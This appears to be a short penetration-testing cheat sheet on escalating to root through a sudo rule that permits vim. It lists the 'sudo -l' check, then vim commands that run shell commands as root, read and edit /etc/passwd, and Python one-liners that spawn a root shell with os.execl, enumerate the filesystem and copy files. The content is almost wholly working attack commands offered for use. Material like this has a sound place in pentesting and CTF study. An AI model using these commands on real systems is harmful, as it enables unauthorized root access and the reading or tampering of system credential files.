# Sudo Vim Privilege Escalation

The `sudo vim` command might be vulnerable to privilege escalation (PrivEsc).

### Investigation <a href="#investigation" id="investigation"></a>

```
sudo -l

(ALL) NOPASSWD: vim example.txt
```

If we can execute **"vim"** command as root, we can execute the shell command in the vim editor.

### Exploitation <a href="#exploitation" id="exploitation"></a>

Simply run **"vim"** command as root.

```
sudo vim example.txt
```

In Vim editor, we can run shell commands as root.

```
:r!whoami
```

#### Options <a href="#options" id="options"></a>

```shellscript
# Read environment variables
# - We can list them by entering [tab] key after `:echo $`.
:echo $PATH

# Read another file
:read /etc/passwd

# Edit another file
:edit /etc/passwd

# Execute Python script
:py import os;os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
:py3 import os;os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
# Enumeration
:py3 import os;print(os.listdir("/"))
# Write file from another file
:py3 open("/tmp/new_file", "wb").write(open("/tmp/original_file", "rb").read())
```
